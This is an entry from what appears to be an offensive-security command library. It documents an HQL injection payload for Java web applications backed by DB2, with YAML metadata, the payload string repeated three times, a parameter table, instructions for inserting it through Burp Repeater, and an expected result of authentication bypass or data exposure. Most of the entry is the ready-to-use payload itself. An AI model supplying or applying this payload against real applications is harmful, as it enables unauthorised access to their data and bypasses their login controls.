---
id: 4d61e246-28d4-4da2-8dfe-d3900a30b45c
name: execute-hql-injection-payload
type: command
executor: bash
data: >-
  dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select
  count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
output: null
created_at: '2023-04-06T03:56:33.438498+00:00'
updated_at: '2023-04-10T20:22:27.355781+00:00'
platforms:
  - Java
  - Web
tags:
  - hql-injection
  - payload
verified: true
validated: true
---

# execute-hql-injection-payload

## Command

```bash
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```

## Description

This command injects a malicious payload into an HQL parameter (e.g., 'dummy') to exploit quote-based injection using a Java constant. It closes the string, adds a bypass condition, and comments out the rest of the query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| dummy | Placeholder input field value to prepend | Yes |
| C_QUOTE_1 | Reference to single quote constant | Yes |
| X() | DB2 function for expression evaluation | Built-in |
| CHAR(41) | ASCII for ')' to close expressions | Built-in |
| sysibm.sysdummy1 | System table for tautology | Built-in |

## Examples

### Basic Usage

```bash
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```

### In Burp Repeater

Intercept a POST request and replace the parameter value with the above payload.

## Expected Output

Application executes the altered HQL query, returning data as if the condition is true (e.g., all posts or auth bypass).

## Related

- [[procedures/Exploit-HQL-Injection-via-Java-Constants]]
